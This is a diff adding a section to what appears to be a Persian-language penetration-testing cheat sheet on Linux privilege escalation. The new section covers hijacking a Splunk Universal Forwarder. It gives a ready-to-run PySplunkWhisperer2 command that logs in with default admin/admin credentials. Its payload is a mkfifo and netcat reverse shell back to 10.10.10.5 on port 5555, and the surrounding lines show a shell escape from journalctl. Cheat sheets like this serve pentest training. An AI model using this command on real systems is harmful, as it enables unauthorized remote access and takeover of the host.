@@ -338,6 +338,13 @@ sudo journalctl
 !/bin/sh
 ```
 
+### ارتقا دسترسی با Splunk Universal Forward Hijacking
+
+```text
+python PySplunkWhisperer2_remote.py --lhost 10.10.10.5 --host 10.10.15.20 --username admin --password admin --payload '/bin/bash -c "rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp/luci11|/bin/sh -i 2>&1|nc 10.10.10.5 5555 >/tmp/luci11"'
+
+```
+
 ### افزایش دسترسی با فایل 00-header
 
 ```text
